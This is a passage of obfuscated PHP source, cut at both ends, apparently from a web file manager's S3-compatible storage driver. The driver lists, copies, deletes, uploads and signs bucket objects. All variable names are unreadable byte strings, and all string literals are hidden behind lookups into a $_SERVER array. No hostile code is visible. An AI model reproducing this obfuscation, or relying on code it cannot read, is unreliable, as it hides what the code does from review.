$á‘ÆˆòÙ <= count($‹è±é¶) + 1; $á‘ÆˆòÙ++) { $Ìš®êı = $Æ×ÅÖÁ . "\x28{$á‘ÆˆòÙ}\x29{$”¾óĞùû}"; if (!in_array_not_case($Ìš®êı, $‹è±é¶)) { return $Ìš®êı; } } return $Ìš®êı; } public function listAllFiles($¼œø‰Œà, $º±ı÷ç«, $è½¯ğ€ = array()) { $ÂÂÉ…Õ =& $_SERVER[¯µç›È¢]; if (empty($º±ı÷ç«)) { return array(); } $Í–ŒË Á = array(); $¼œø‰Œà = trim($¼œø‰Œà, $ÂÂÉ…Õ[8]); foreach ($º±ı÷ç« as $„®‚¦òû) { $ÙŒçÆ©Ë = ltrim(substr(trim($„®‚¦òû, $ÂÂÉ…Õ[8]), strlen($¼œø‰Œà)), $ÂÂÉ…Õ[8]); $Í–ŒË Á = array_merge($Í–ŒË Á, $this->slicePath($ÙŒçÆ©Ë)); } $Ø¡Òı±£ = array(); foreach (array_unique($Í–ŒË Á) as $„®‚¦òû) { $·Æ ’£ = array($ÂÂÉ…Õ[88] => $this->getPathOuter($ÂÂÉ…Õ[8] . $¼œø‰Œà . $ÂÂÉ…Õ[8] . $„®‚¦òû), $ÂÂÉ…Õ[89] => 1, $ÂÂÉ…Õ[90] => 0); if (substr($„®‚¦òû, -1) != $ÂÂÉ…Õ[8]) { $·Æ ’£[$ÂÂÉ…Õ[89]] = 0; $ç›•Ù¬¾ = $this->getPath($¼œø‰Œà . $ÂÂÉ…Õ[8] . $„®‚¦òû); $·Æ ’£[$ÂÂÉ…Õ[90]] = isset($è½¯ğ€[$ç›•Ù¬¾]) ? $è½¯ğ€[$ç›•Ù¬¾] : $this->size($ç›•Ù¬¾); } $Ø¡Òı±£[] = $·Æ ’£; } return $Ø¡Òı±£; } public function slicePath($³ä™õõ) { $áÆó‹÷œ =& $_SERVER[¯µç›È¢]; $–˜îüö› = explode($áÆó‹÷œ[8], trim($³ä™õõ, $áÆó‹÷œ[8])); $µ³•¯ó£ = 0; do { ++$µ³•¯ó£; $´÷Ñµ’’[] = implode($áÆó‹÷œ[8], array_slice($–˜îüö›, 0, $µ³•¯ó£)) . $áÆó‹÷œ[8]; } while ($µ³•¯ó£ < count($–˜îüö›)); $´÷Ñµ’’[count($–˜îüö›) - 1] = $³ä™õõ; return $´÷Ñµ’’; } public function getHost() { $´Èæ¡ÆÛ =& $_SERVER[¯µç›È¢]; $Èä¿üËÒ = parse_url(trim($this->domain, $´Èæ¡ÆÛ[8])); $¸º†¥’ = isset($Èä¿üËÒ[$´Èæ¡ÆÛ[187]]) ? $Èä¿üËÒ[$´Èæ¡ÆÛ[187]] : http_type(); $Š¤‡¦Ïâ = isset($Èä¿üËÒ[$´Èæ¡ÆÛ[188]]) ? $Èä¿üËÒ[$´Èæ¡ÆÛ[188]] : $Èä¿üËÒ[$´Èæ¡ÆÛ[88]]; if (isset($Èä¿üËÒ[$´Èæ¡ÆÛ[189]])) { $Š¤‡¦Ïâ .= $´Èæ¡ÆÛ[4] . $Èä¿üËÒ[$´Èæ¡ÆÛ[189]]; } return $¸º†¥’ . $´Èæ¡ÆÛ[190] . $Š¤‡¦Ïâ; } public function pathEncode($ÒìÃú) { $çêªç±ö =& $_SERVER[¯µç›È¢]; return str_replace($çêªç±ö[191], $çêªç±ö[8], rawurlencode($ÒìÃú)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ƒºá¦İ) { set_timeout(); require_once SDK_DIR . $_SERVER[¯µç›È¢][192]; parent::__construct(); $this->_init($ƒºá¦İ); } public function _init($Ã¤¹ÔÚµ) { foreach ($Ã¤¹ÔÚµ as $‡ƒà¯ŒÀ => $Òµ´Ñ¦¤) { if (isset($this->{$‡ƒà¯ŒÀ})) { $this->{$‡ƒà¯ŒÀ} = $Òµ´Ñ¦¤; } } $this->endpoint = $Ã¤¹ÔÚµ[$_SERVER[¯µç›È¢][193]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($»í“«º‡ = "\166\x34") { $this->signVer = $»í“«º‡; $this->client->setSignatureVersion($»í“«º‡); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $µÉ¦ü¯Á =& $_SERVER[¯µç›È¢]; $¥¯ªÁ = $this->getBucketCors(); if (!$¥¯ªÁ || !is_array($¥¯ªÁ)) { return !1; } if ($¥¯ªÁ[$µÉ¦ü¯Á[194]] != $µÉ¦ü¯Á[195] || $¥¯ªÁ[$µÉ¦ü¯Á[196]] != $µÉ¦ü¯Á[195]) { return !1; } $ÂÔåŠòá = array_map($µÉ¦ü¯Á[197], $¥¯ªÁ[$µÉ¦ü¯Á[198]]); if (!is_array($ÂÔåŠòá)) { $ÂÔåŠòá = array(); } $õÍ¤„¤ = array($µÉ¦ü¯Á[199], $µÉ¦ü¯Á[200], $µÉ¦ü¯Á[201], $µÉ¦ü¯Á[202], $µÉ¦ü¯Á[203]); $Ü›«öÖ¯ = array_diff($õÍ¤„¤, $ÂÔåŠòá); return empty($Ü›«öÖ¯); } public function mkfile($É—¾€Õ, $÷‚ßÉÛÌ = '', $‚²Ğùµü = REPEAT_RENAME) { $šúàäÔ… = $this->setContent($É—¾€Õ, $÷‚ßÉÛÌ); if ($šúàäÔ… !== !1) { return $this->getPathOuter($É—¾€Õ); } return !1; } public function mkdir($óí—é•, $“µÏ©Ùæ = REPEAT_SKIP) { $Ğóõí‰© =& $_SERVER[¯µç›È¢]; if (empty($óí—é•) && $óí—é• !== $Ğóõí‰©[204]) { return !1; } if ($this->_isFolder($óí—é•)) { return $this->getPathOuter($óí—é•); } $·â¨Ê‚” = $this->setContent($óí—é•, $Ğóõí‰©[12], !0); if ($·â¨Ê‚” !== !1) { return $this->getPathOuter($óí—é•); } return !1; } public function copyFile($¥£ÊÁÚÃ, $áİô˜Á, $²‡ÜÍÇ = array()) { $†‡Îã =& $_SERVER[¯µç›È¢]; $ñ„ç­Ÿ” = $this->objectMeta($¥£ÊÁÚÃ); if (!$ñ„ç­Ÿ”) { return !1; } if ($ñ„ç­Ÿ”[$†‡Îã[90]] <= 1024 * 1024 * 200) { $É…Œ¬ÑÙ = $this->client->copyObject($this->bucket, $¥£ÊÁÚÃ, $this->bucket, $áİô˜Á, $†‡Îã[205], $²‡ÜÍÇ); } else { $É…Œ¬ÑÙ = $this->client->multiCopyObject($this->bucket, $¥£ÊÁÚÃ, $this->bucket, $áİô˜Á, $²‡ÜÍÇ); } $É…Œ¬ÑÙ = $É…Œ¬ÑÙ ? $this->getPathOuter($áİô˜Á) : !1; return $É…Œ¬ÑÙ; } public function moveFile($¼Œ†Ëø•, $²ôËê²î) { if ($this->copyFile($¼Œ†Ëø•, $²ôËê²î)) { $this->delFile($¼Œ†Ëø•); return $this->getPathOuter($²ôËê²î); } return !1; } public function delFile($¦é¾§¥Á) { return $this->client->deleteObject($this->bucket, $¦é¾§¥Á); } public function delFolder($óğâÅÇº) { $øöó¬Í¬ =& $_SERVER[¯µç›È¢]; if (!$this->exist($óğâÅÇº)) { return !0; } $this->listItemCache = !1; $Œ»Úé¹´ = $this->fileList($óğâÅÇº); $this->listItemCache = !0; $×îÊÒ‰ = trim($óğâÅÇº, $øöó¬Í¬[8]) . $øöó¬Í¬[8]; if (!empty($óğâÅÇº) && $óğâÅÇº !== $øöó¬Í¬[204] && !in_array($×îÊÒ‰, $Œ»Úé¹´[$øöó¬Í¬[87]])) { $Œ»Úé¹´[$øöó¬Í¬[87]][] = $×îÊÒ‰; } $Èİ¡Á ¾ = $this->delByBatch($Œ»Úé¹´[$øöó¬Í¬[86]]); if (!$Èİ¡Á ¾) { return !1; } $Èİ¡Á ¾ = $this->delByBatch($Œ»Úé¹´[$øöó¬Í¬[87]]); if (!$Èİ¡Á ¾) { return !1; } return $this->delFile($×îÊÒ‰); } private function delByBatch($Ñø­¼°œ) { foreach (array_chunk($Ñø­¼°œ, 1000) as $İôÓË„Ü) { $÷©ä„Ï = $this->client->deleteObjects($this->bucket, $İôÓË„Ü); if (!$÷©ä„Ï) { return !1; } } return !0; } public function rename($¨…«ğ‹ê, $•–â§Õ¨) { return $this->renameObject($¨…«ğ‹ê, $•–â§Õ¨); } public function listPath($â›Şµ, $î©ù š÷ = false) { $ü„ıÊ‰ =& $_SERVER[¯µç›È¢]; $üºÈ = $this->fileList($â›Şµ, $ü„ıÊ‰[8], !0); foreach ($üºÈ[$ü„ıÊ‰[87]] as $Šé˜™Èî => $ëÓÚëØÁ) { $üºÈ[$ü„ıÊ‰[87]][$Šé˜™Èî] = $this->folderInfo($ëÓÚëØÁ, $î©ù š÷); } foreach ($üºÈ[$ü„ıÊ‰[86]] as $Šé˜™Èî => $ëÓÚëØÁ) { $üºÈ[$ü„ıÊ‰[86]][$Šé˜™Èî] = $this->fileInfo($ëÓÚëØÁ[$ü„ıÊ‰[32]], $î©ù š÷, $ëÓÚëØÁ); } return $üºÈ; } private function fileInfo($ğúŒ…Ş½, $á—ÙÒ¡ = false, $š‰àÉ¬” = array()) { $°”€¥Éë =& $_SERVER[¯µç›È¢]; $ØÎ›²±Ú = array($°”€¥Éë[32] => $this->pathThis($ğúŒ…Ş½), $°”€¥Éë[88] => $this->getPathOuter($ğúŒ…Ş½), $°”€¥Éë[33] => $°”€¥Éë[206], $°”€¥Éë[181] => $this->ext($ğúŒ…Ş½), $°”€¥Éë[90] => isset($š‰àÉ¬”[$°”€¥Éë[90]]) ? $š‰àÉ¬”[$°”€¥Éë[90]] : 0); if ($á—ÙÒ¡) { return $ØÎ›²±Ú; } $ØÎ›²±Ú[$°”€¥Éë[207]] = $ØÎ›²±Ú[$°”€¥Éë[96]] = 0; $ØÎ›²±Ú[$°”€¥Éë[208]] = $ØÎ›²±Ú[$°”€¥Éë[209]] = !0; if (empty($š‰àÉ¬”)) { $š‰àÉ¬” = $this->objectMeta($ğúŒ…Ş½); if (!$š‰àÉ¬”) { return $ØÎ›²±Ú; } } if (isset($š‰àÉ¬”[$°”€¥Éë[210]])) { $ØÎ›²±Ú[$°”€¥Éë[96]] = $š‰àÉ¬”[$°”€¥Éë[210]]; } if (isset($š‰àÉ¬”[$°”€¥Éë[90]])) { $ØÎ›²±Ú[$°”€¥Éë[90]] = $š‰àÉ¬”[$°”€¥Éë[90]]; } return $ØÎ›²±Ú; } private function folderInfo($Ö÷ßÜÓ, $ëÔÆìÇ‰ = false) { $“¥… ‰‘ =& $_SERVER[¯µç›È¢]; $©ä¹óÙå = array($“¥… ‰‘[32] => $this->pathThis($Ö÷ßÜÓ), $“¥… ‰‘[88] => $this->getPathOuter($“¥… ‰‘[8] . $Ö÷ßÜÓ), $“¥… ‰‘[33] => $“¥… ‰‘[89]); if ($ëÔÆìÇ‰) { return $©ä¹óÙå; } $©ä¹óÙå[$“¥… ‰‘[207]] = $©ä¹óÙå[$“¥… ‰‘[96]] = 0; $©ä¹óÙå[$“¥… ‰‘[208]] = $©ä¹óÙå[$“¥… ‰‘[209]] = !0; if ($Ö÷ßÜÓ == $“¥… ‰‘[12]) { return $©ä¹óÙå; } $Ö÷ßÜÓ = trim($Ö÷ßÜÓ, $“¥… ‰‘[8]) . $“¥… ‰‘[8]; $ ßƒ¢ºØ = $this->objectMeta($Ö÷ßÜÓ); if (isset($ ßƒ¢ºØ[$“¥… ‰‘[210]])) { $©ä¹óÙå[$“¥… ‰‘[207]] = $ ßƒ¢ºØ[$“¥… ‰‘[210]]; } return $©ä¹óÙå; } private function fileList($ßÒ¾ÆÉí, $‘öşÍÇÚ = '', $¸ü× ›ô = 0) { $ßš§¡§ =& $_SERVER[¯µç›È¢]; $ãúÓÚºñ = rtrim($ßÒ¾ÆÉí, $ßš§¡§[8]) . $ßš§¡§[8]; $ôÚáïÇ¥ = $this->listObjs($ãúÓÚºñ, null, null, $‘öşÍÇÚ); if (!$ôÚáïÇ¥) { return array($ßš§¡§[87] => array(), $ßš§¡§[86] => array()); } $çû¢íŸ = $this->listItemCache === !1 ? !1 : !0; $ğ‹Àßæü = $Ãùì²Û¥ = array(); foreach ($ôÚáïÇ¥[$ßš§¡§[211]] as $Š½ôñêÑ) { $İà–Üæ‡ = $Š½ôñêÑ[$ßš§¡§[32]]; if ($İà–Üæ‡ == $ãúÓÚºñ) { continue; } $Á«óÌÁ = isset($Š½ôñêÑ[$ßš§¡§[90]]) ? $Š½ôñêÑ[$ßš§¡§[90]] : 0; $›å×á = $Á«óÌÁ == 0 && substr($İà–Üæ‡, strlen($İà–Üæ‡) - 1, 1) == $ßš§¡§[8] ? !0 : !1; if ($çû¢íŸ) { $this->cacheMethod($ßš§¡§[212], $İà–Üæ‡, $›å×á); $this->cacheMethod($ßš§¡§[213], $İà–Üæ‡, $Š½ôñêÑ); } if ($›å×á) { $ğ‹Àßæü[] = $İà–Üæ‡; continue; } $Ãùì²Û¥[] = $¸ü× ›ô ? $Š½ôñêÑ : $İà–Üæ‡; } foreach ($ôÚáïÇ¥[$ßš§¡§[214]] as $Š½ôñêÑ) { $ğ‹Àßæü[] = $Š½ôñêÑ[$ßš§¡§[32]]; if ($çû¢íŸ) { $this->cacheMethod($ßš§¡§[212], $Š½ôñêÑ[$ßš§¡§[32]], !0); } } if ($çû¢íŸ) { $this->cacheMethod($ßš§¡§[212], $ßÒ¾ÆÉí, !0); } return array($ßš§¡§[87] => $ğ‹Àßæü, $ßš§¡§[86] => $Ãùì²Û¥); } private function listObjs($ø–Ê‹ö…, $®’‹Å‹ = null, $¤ğ¡ğå¹ = null, $İâ˜äü˜ = null) { $¦È¤õæŞ =& $_SERVER[¯µç›È¢]; $ø–Ê‹ö… = trim($ø–Ê‹ö…, $¦È¤õæŞ[8]); $ËÜûç– = empty($ø–Ê‹ö…) && $ø–Ê‹ö… !== $¦È¤õæŞ[204] ? $¦È¤õæŞ[12] : $ø–Ê‹ö… . $¦È¤õæŞ[8]; return $this->client->getBucket($this->bucket, $ËÜûç–, $®’‹Å‹, $¤ğ¡ğå¹, $İâ˜äü˜, !0); } public function has($“èçë¹Ä, $õ„‚úôÜ = false, $‰Ë Ô” = true) { $±Ÿöö‚€ =& $_SERVER[¯µç›È¢]; $“èçë¹Ä = trim($“èçë¹Ä, $±Ÿöö‚€[8]); $™ñÚİÇ… = empty($“èçë¹Ä) && $“èçë¹Ä !== $±Ÿöö‚€[204] ? $±Ÿöö‚€[12] : $“èçë¹Ä . $±Ÿöö‚€[8]; $¬ô—çÓ± = null; $‰óğ¦á = 500; $ÅÇíŸ¬© = $±Ÿöö‚€[8]; $ô…Óæáœ = $Ó¢ÀĞÄ… = array(); while (!0) { $ù†–ã› = $this->listObjs($“èçë¹Ä, $¬ô—çÓ±, $‰óğ¦á, $ÅÇíŸ¬©); if (!$ù†–ã›) { break; } $¬ô—çÓ± = $ù†–ã›[$±Ÿöö‚€[215]]; $©æïã“½ = $ù†–ã›[$±Ÿöö‚€[211]]; $ù©ªİÒ’ = $ù†–ã›[$±Ÿöö‚€[214]]; if (empty($©æïã“½) && empty($ù©ªİÒ’)) { break; } if (count($©æïã“½) == 1 && $©æïã“½[0][$±Ÿöö‚€[32]] == $™ñÚİÇ…) { break; } if ($õ„‚úôÜ) { if (count($©æïã“½)) { $©æïã“½ = array_column($©æïã“½, $±Ÿöö‚€[32]); $ô…Óæáœ = array_merge($ô…Óæáœ, $©æïã“½); } if (count($ù©ªİÒ’)) { $ù©ªİÒ’ = array_column($ù©ªİÒ’, $±Ÿöö‚€[32]); $Ó¢ÀĞÄ… = array_merge($Ó¢ÀĞÄ…, $ù©ªİÒ’); } if ($¬ô—çÓ± === null) { break; } continue; } if ($‰Ë Ô”) { if (!empty($©æïã“½)) { if (count($©æïã“½) > 1 || isset($©æïã“½[0][$±Ÿöö‚€[32]]) && $©æïã“½[0][$±Ÿöö‚€[32]] != $™ñÚİÇ…) { return !0; } } } else { if (!empty($ù©ªİÒ’)) { return !0; } } if ($¬ô—çÓ± === null) { break; } } if ($õ„‚úôÜ) { $ô…Óæáœ = array_diff($ô…Óæáœ, array($™ñÚİÇ…)); $ô…Óæáœ = count(array_unique($ô…Óæáœ)); $Ó¢ÀĞÄ… = count(array_unique($Ó¢ÀĞÄ…)); return array($±Ÿöö‚€[216] => $ô…Óæáœ, $±Ÿöö‚€[217] => $Ó¢ÀĞÄ…); } return !1; } public function listAll($Ë½»ë’·) { $è¢ÄÁ›Ä =& $_SERVER[¯µç›È¢]; $½ë”ŸÏ = $this->fileList($Ë½»ë’·, $è¢ÄÁ›Ä[12], !0); $ìÊÒ®Òİ = array(); foreach ($½ë”ŸÏ[$è¢ÄÁ›Ä[86]] as $…çòü¤˜) { $ìÊÒ®Òİ[$…çòü¤˜[$è¢ÄÁ›Ä[32]]] = $…çòü¤˜[$è¢ÄÁ›Ä[90]]; } foreach ($½ë”ŸÏ[$è¢ÄÁ›Ä[87]] as $…çòü¤˜) { if (is_string($…çòü¤˜)) { $ìÊÒ®Òİ[$…çòü¤˜] = 0; } } return $this->listAllFiles($Ë½»ë’·, array_keys($ìÊÒ®Òİ), $ìÊÒ®Òİ); } public function canRead($ë¼öîú½) { $ËØËÉ·è =& $_SERVER[¯µç›È¢]; $óŠ€òÍô = $this->client->getAccessControlPolicy($this->bucket, $ë¼öîú½); if (!$óŠ€òÍô) { return !1; } return in_array($óŠ€òÍô, array($ËØËÉ·è[218], $ËØËÉ·è[219], $ËØËÉ·è[220])) ? !0 : !1; } public function canWrite($å‘½©¤) { $İÕôü‡± =& $_SERVER[¯µç›È¢]; $ÍèİÉ³± = $this->client->getAccessControlPolicy($this->bucket, $å‘½©¤); if (!$ÍèİÉ³±) { return !1; } return in_array($ÍèİÉ³±, array($İÕôü‡±[218], $İÕôü‡±[219])) ? !0 : !1; } public function getContent($ïşêš¢) { return $this->client->getObject($this->bucket, $ïşêš¢); } public function setContent($ô½½–ãÂ, $îÙ¦¬Äú = '', $åÇè·Ï = false) { $‚½Ü×¬Â =& $_SERVER[¯µç›È¢]; $ô½½–ãÂ = $åÇè·Ï ? trim($ô½½–ãÂ, $‚½Ü×¬Â[8]) . $‚½Ü×¬Â[8] : $ô½½–ãÂ; $ÍÃ¹”ä‡ = get_file_mime(get_path_ext($ô½½–ãÂ)); $ëÒ­çé³ = $this->client->putObject($îÙ¦¬Äú, $this->bucket, $ô½½–ãÂ, $‚½Ü×¬Â[205], array(), $ÍÃ¹”ä‡); if (!$ëÒ­çé³) { return !1; } if ($åÇè·Ï) { return !0; } $this->cacheMethod(null, null); $ëÒ­çé³ = $this->copyFile($ô½½–ãÂ, $ô½½–ãÂ, array($‚½Ü×¬Â[221] => $ëÒ­çé³[$‚½Ü×¬Â[222]])); return $ëÒ­çé³ ? !0 : !1; } public function fileSubstr($ô¨Ãê¿Ì, $å¾Ï¡š¼, $Ü™ùı) { $ç‘‹Í‰¿ = $å¾Ï¡š¼ + $Ü™ùı - 1; return $this->client->getObject($this->bucket, $ô¨Ãê¿Ì, array($_SERVER[¯µç›È¢][223] => "\142\171\164\145\x73\x3d{$å¾Ï¡š¼}\x2d{$ç‘‹Í‰¿}")); } public function upload($ì¦´§´Â, $«¨ ”ì, $‚ı–õ¢É = false, $ùµ¬ÕßÜ = REPEAT_REPLACE) { $ê€ÚåºÙ =& $_SERVER[¯µç›È¢]; $Ûà€®„® = array($ê€ÚåºÙ[221] => @md5_file($«¨ ”ì)); $ŠïïœÜ = array($ê€ÚåºÙ[224] => get_file_mime(get_path_ext($ì¦´§´Â))); if (IO::size($«¨ ”ì) <= 1024 * 1024 * 200) { $¼é†•— = $this->client->putObjectFile($«¨ ”ì, $this->bucket, $ì¦´§´Â, $ê€ÚåºÙ[205], $Ûà€®„®, $ŠïïœÜ); return !empty($¼é†•—) ? $this->getPathOuter($ì¦´§´Â) : !1; } $›ØÉŞ” = $this->client->multiUploadObject($«¨ ”ì, $this->bucket, trim($ì¦´§´Â, $ê€ÚåºÙ[8]), $Ûà€®„®, $ŠïïœÜ); return $›ØÉŞ” ? $this->getPathOuter($ì¦´§´Â) : !1; } public function download($‰ùâĞ¨õ, $ïƒÜ”) { if (!@is_dir($this->pathFather($ïƒÜ”)) && !IO::mkdir($this->pathFather($ïƒÜ”))) { return !1; } $ˆ¬ËĞ­‘ = $this->client->getObject($this->bucket, $‰ùâĞ¨õ, array(), $ïƒÜ”); return $ˆ¬ËĞ­‘ !== !1 ? $ïƒÜ” : !1; } public function link($ëÍÜóµ¤, $ƒ·Ò³³ = array()) { $¾´ÖîûŠ =& $_SERVER[¯µç›È¢]; if ($this->signVer == $¾´ÖîûŠ[225]) { return $this->client->getAuthenticatedURL($this->bucket, $ëÍÜóµ¤, 3600 * 12, $ƒ·Ò³³); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ëÍÜóµ¤, $¾´ÖîûŠ[8]), 3600 * 12, $this->region, array(), !0, $ƒ·Ò³³); } public function fileOut($Îú¢ƒî, $È‚§¼å = false, $Ñğ”ã› = false, $Ì‰€¿Û× = '') { $¼°ô¾ï =& $_SERVER[¯µç›È¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($Îú¢ƒî, $È‚§¼å, $Ñğ”ã›, $Ì‰€¿Û×); } if (!$Ñğ”ã›) { $Ñğ”ã› = $this->pathThis($Îú¢ƒî); } $¨½Ê˜±§ = get_file_mime(get_path_ext($Ñğ”ã›)); if ($¨½Ê˜±§ == $¼°ô¾ï[226]) { return parent::fileOut($Îú¢ƒî, $È‚§¼å, $Ñğ”ã›, $Ì‰€¿Û×); } $óÎ—Ó†¢ = array($¼°ô¾ï[227] => $¨½Ê˜±§); if ($È‚§¼å) { $óÎ—Ó†¢[$¼°ô¾ï[228]] = $¼°ô¾ï[229] . rawurlencode($Ñğ”ã›); } else { } $ÇÎè¸«½ = $this->link($Îú¢ƒî, $óÎ—Ó†¢); $this->fileOutLink($ÇÎè¸«½); } public function fileOutServer($Úõø§ ı, $‡„ƒùßı = false, $ôìô»“» = false, $ ·å¾§ = '') { parent::fileOut($Úõø§ ı, $‡„ƒùßı, $ôìô»“», $ ·å¾§); } public function fileOutImageServer($ŒâÅ•À, $îóŒÊºù = 250) { parent::fileOutImage($ŒâÅ•À, $îóŒÊºù); } public function hashMd5($ŒçÔĞ‹ƒ, $şÄÍÛÂó = '') { $×º‡’À =& $_SERVER[¯µç›È¢]; $®·ìéå = $this->objectMeta($ŒçÔĞ‹ƒ); if (!$®·ìéå) { return !1; } $şÄÍÛÂó = $şÄÍÛÂó ? $şÄÍÛÂó : _get($®·ìéå, $×º‡’À[230]); $şÄÍÛÂó = $şÄÍÛÂó ? $şÄÍÛÂó : _get($®·ìéå, $×º‡’À[222], $×º‡’À[12]); return $şÄÍÛÂó; } public function uploadFormData($±“ù¥ÅÂ, $Ü±»½—› = 3600) { $ï½ØÂµ =& $_SERVER[¯µç›È¢]; $¿÷‹ÕÀ² = $this->pathFather($±“ù¥ÅÂ); $ØØ™˜ì– = $this->client->getHttpUploadPostParams($this->bucket, $¿÷‹ÕÀ², $ï½ØÂµ[205], $Ü±»½—›); return array_merge((array) $ØØ™˜ì–, array($ï½ØÂµ[188] => $this->getHost())); } public function multiUploadFormData($å±Š, $ë·µÖ¡ = 3600) { $³Ñ§½¸ñ =& $_SERVER[¯µç›È¢]; $Ÿ§«…şÄ = gmdate($³Ñ§½¸ñ[231]); $ş¼òØ€Á = array(); $ƒÖì§¬à = $this->client->getUploadId($this->bucket, $å±Š, $ş¼òØ€Á); if (!$ƒÖì§¬à) { return !1; } return array($³Ñ§½¸ñ[232] => $ƒÖì§¬à, $³Ñ§½¸ñ[188] => $this->getHost() . $³Ñ§½¸ñ[8] . $this->pathEncode($å±Š), $³Ñ§½¸ñ[233] => $Ÿ§«…şÄ, $³Ñ§½¸ñ[105] => $å±Š); } public function multiUploadAuthData($·ÎŒ„˜×, $¸âÜ²ˆğ = array()) { $ì‘ùÂ¦ =& $_SERVER[¯µç›È¢]; $€ûõ®Áç = isset($¸âÜ²ˆğ[$ì‘ùÂ¦[233]]) ? $¸âÜ²ˆğ[$ì‘ùÂ¦[233]] : gmdate($ì‘ùÂ¦[231]); $ÏøÉ¤¹Ğ = isset($¸âÜ²ˆğ[$ì‘ùÂ¦[181]]) ? $¸âÜ²ˆğ[$ì‘ùÂ¦[181]] : $ì‘ùÂ¦[12]; $Òí¶‚¸÷ = $¸âÜ²ˆğ[$ì‘ùÂ¦[105]]; unset($¸âÜ²ˆğ[$ì‘ùÂ¦[105]]); if (isset($¸âÜ²ˆğ[$ì‘ùÂ¦[234]])) { $¸âÜ²ˆğ[$ì‘ùÂ¦[233]] = $€ûõ®Áç; return $this->listUploadParts($Òí¶‚¸÷, $¸âÜ²ˆğ); } $¯ÀúŠà² = array($ì‘ùÂ¦[235], $ì‘ùÂ¦[12], $ì‘ùÂ¦[131], $ì‘ùÂ¦[12], "\170\55\x61\x6d\x7a\x2d\144\x61\164\145\72{$€ûõ®Áç}", $ì‘ùÂ¦[8] . $this->bucket . $ì‘ùÂ¦[8] . $this->pathEncode($Òí¶‚¸÷) . $ÏøÉ¤¹Ğ); if (strpos($ÏøÉ¤¹Ğ, $ì‘ùÂ¦[236]) === 0) { $¯ÀúŠà²[0] = $ì‘ùÂ¦[237]; } if (isset($¸âÜ²ˆğ[$ì‘ùÂ¦[238]]) && $¸âÜ²ˆğ[$ì‘ùÂ¦[238]] == $ì‘ùÂ¦[239]) { $¯ÀúŠà²[0] = $ì‘ùÂ¦[239]; } $¦ê¤ ó” = implode($ì‘ùÂ¦[66], $¯ÀúŠà²); $€¿×¸˜ƒ = base64_encode(hash_hmac($ì‘ùÂ¦[240], $¦ê¤ ó”, $this->secret, !0)); $×òñÑÃ’ = $ì‘ùÂ¦[241] . $this->accessKey . $ì‘ùÂ¦[4] . $€¿×¸˜ƒ; if (strpos($ÏøÉ¤¹Ğ, $ì‘ùÂ¦[236]) === 0) { return array($ì‘ùÂ¦[242] => $×òñÑÃ’, $ì‘ùÂ¦[233] => $€ûõ®Áç); } return $×òñÑÃ’; } public function listUploadParts($ÃŞ‹ë°Ô, $û¾”İŒé = array()) { $™×æî² =& $_SERVER[¯µç›È¢]; $ °Ñ§ïë = str_replace($™×æî²[243], $™×æî²[12], $û¾”İŒé[$™×æî²[181]]); $Ğ »Äî = $this->client->listParts($this->bucket, $ÃŞ‹ë°Ô, $ °Ñ§ïë); if (!$Ğ »Äî) { return !1; } unset($û¾”İŒé[$™×æî²[234]], $û¾”İŒé[$™×æî²[238]]); $û¾”İŒé[$™×æî²[105]] = $ÃŞ‹ë°Ô; $€ë¸Æ™Â = $this->multiUploadAuthData($ÃŞ‹ë°Ô, $û¾”İŒé); if (empty($€ë¸Æ™Â)) { return !1; } return array($™×æî²[242] => $€ë¸Æ™Â, $™×æî²[233] => $û¾”İŒé[$™×æî²[233]], $™×æî²[244] => $Ğ »Äî); } public function getHost() { return parent::getHost() . $_SERVER[¯µç›È¢][8] . $this->bucket; } public function size($êàÚÏ„€) { $Ñ ¸¦û = $this->objectMeta($êàÚÏ„€); return $Ñ ¸¦û ? $Ñ ¸¦û[$_SERVER[¯µç›È¢][90]] : 0; } public function info($±‡¿ç´º) { if ($this->isFolder($±‡¿ç´º)) { return $this->folderInfo($±‡¿ç´º); } else { if ($this->isFile($±‡¿ç´º)) { return $this->fileInfo($±‡¿ç´º); } } return !1; } public function exist($ËÖŒğ‰Ó) { return $this->isFile($ËÖŒğ‰Ó) || $this->isFolder($ËÖŒğ‰Ó); } public function isFile($»½¿ß×¢) { return !$this->isFolder($»½¿ß×¢) && $this->objectMeta($»½¿ß×¢); } public function isFolder($¶êâñ†“) { return $this->cacheMethod($_SERVER[¯µç›È¢][212], $¶êâñ†“); } protected function objectMeta($ëì÷ü‹) { return $this->cacheMethod($_SERVER[¯µç›È¢][213], $ëì÷ü‹); } protected function _objectMeta($å­Òòß”) { $âØŸÀı =& $_SERVER[¯µç›È¢]; $å­Òòß” = rtrim($å­Òòß”, $âØŸÀı[8]); try { $Û³İ£ô­ = $this->client->getObjectInfo($this->bucket, $å­Òòß”); if (!isset($Û³İ£ô­[$âØŸÀı[230]]) && isset($Û³İ£ô­[$âØŸÀı[245]])) { $Û³İ£ô­[$âØŸÀı[230]] = $Û³İ£ô­[$âØŸÀı[245]]; } } catch (Exception $…çÉèüÎ) { $Û³İ£ô­ = !1; } if (!$Û³İ£ô­) { } return $Û³İ£ô­; } protected function _isFolder($Øùß¡æš) { $ÛÕ”ñœò =& $_SERVER[¯µç›È¢]; $Øùß¡æš = rtrim($Øùß¡æš, $ÛÕ”ñœò[8]); if ($Øùß¡æš == $ÛÕ”ñœò[12] || $Øùß¡æš == $ÛÕ”ñœò[8]) { return !0; } $Á„Ü±¼‡ = $this->client->getBucket($this->bucket, $Øùß¡æš, null, 1); if (empty($Á„Ü±¼‡[$ÛÕ”ñœò[211]])) { return !1; } $ÂÙõ¿Ö™ = $Á„Ü±¼‡[$ÛÕ”ñœò[211]][0][$ÛÕ”ñœò[32]]; return stripos($ÂÙõ¿Ö™, $Øùß¡æš . $ÛÕ”ñœò[8]) === 0 ? !0 : !1; if (substr($ÂÙõ¿Ö™, -1) == $ÛÕ”ñœò[8]) { return !0; } if (get_path_this($ÂÙõ¿Ö™) == get_path_this($Øùß¡æš)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($²ı‹¾á) 